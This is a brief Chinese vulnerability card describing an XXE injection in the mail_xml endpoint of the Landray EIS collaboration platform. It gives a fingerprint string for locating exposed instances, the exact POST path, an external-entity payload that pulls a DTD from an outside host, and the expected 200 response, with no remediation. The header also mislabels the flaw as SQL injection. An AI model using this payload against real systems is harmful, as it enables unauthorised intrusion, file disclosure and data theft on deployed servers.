# 蓝凌EIS智慧协同平台mail_xml存在XXE注入漏洞

蓝凌EIS智慧协同平台 ｜ SQL注入 ｜ —
- **指纹**：`body="/Scripts/jquery.landray.dialog.js"`
- **请求**：`POST /mail/mail_server.aspx/mail_xml?type=add HTTP/1.1`

**Payload**
```
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://IP/test.xml"> %remote;]>
```
- **响应特征**：200